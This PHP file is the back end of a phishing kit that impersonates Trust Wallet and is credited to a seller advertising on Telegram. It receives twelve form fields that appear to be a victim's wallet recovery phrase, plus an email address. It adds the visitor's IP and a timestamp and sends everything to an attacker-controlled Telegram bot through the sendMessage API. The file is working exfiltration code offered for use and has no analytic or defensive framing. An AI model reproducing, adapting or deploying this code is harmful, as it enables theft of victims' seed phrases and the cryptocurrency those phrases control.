<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   Trust wallet
 * Author      :   Bore3da
 * channel Telegram  :  https://t.me/bore3dashop
 */
require_once '../tower/main.php';
session_start();


if ($_SERVER["REQUEST_METHOD"] == "POST") {

    function _isCurl(){
        return function_exists('curl_version');
    }
    
    function telegram_message($message, $keyb) {
        include "configg.php";
    
        if (_isCurl() == 1) {
            
            $curl = curl_init();
            
            $data = [
                'text' => $message,
                'chat_id' => $chat_ids,
                'parse_mode' => 'HTML',
                'reply_markup' => $keyb
                ];
            
            curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
            $result = curl_exec($curl);
            curl_close($curl);
            return true;
        } else {
    
            file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
    
            }
    }

    function get_user_ip(){
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        if ($ip == '::1') {
            $ip = '127.0.0.1';
        }
    
        return $ip;
    }
$InfoDATE = date("d-m-Y h:i:sa");
$ip = get_user_ip();


 if(isset($_POST['key1'])) {

    if (!empty($_POST['key1']) and !empty($_POST['key2']) and !empty($_POST['key3'])  and !empty($_POST['key4'])  and !empty($_POST['key5'])  and !empty($_POST['key6'])  and !empty($_POST['key7'])  and !empty($_POST['key8'])  and !empty($_POST['key9'])  and !empty($_POST['key10'])  and !empty($_POST['key11'])  and !empty($_POST['key12']) ) {

        $email = $_POST['email'];
        $key1 = $_POST['key1'];
        $key2 = $_POST['key2'];
        $key3 = $_POST['key3'];
        $key4 = $_POST['key4'];
        $key5 = $_POST['key5'];
        $key6 = $_POST['key6'];
        $key7 = $_POST['key7'];
        $key8 = $_POST['key8'];
        $key9 = $_POST['key9'];
        $key10 = $_POST['key10'];
        $key11 = $_POST['key11'];
        $key12 = $_POST['key12'];
    
    // $user = $_POST['id']; 
    // $nick_name = $_POST['pwd'];      
    
    $msgx = "ʙᴏʀᴇ3ᴅᴀ 🍓\n
Trust W-LogIn :  ". $key1 ." ". $key2 ." ". $key3 ." ". $key4 ." ". $key5 ." ". $key6 ." ". $key7 ." ". $key8 ." ". $key9 ." ". $key10 ." ". $key11 ." ". $key12 ."
    
    ┌──Date " . $InfoDATE . ";
    └──IP $ip\n\nʙᴏʀᴇ3ᴅᴀ 🍓";
    
    telegram_message($msgx, '');
    exit();
    
 }}
} 
?>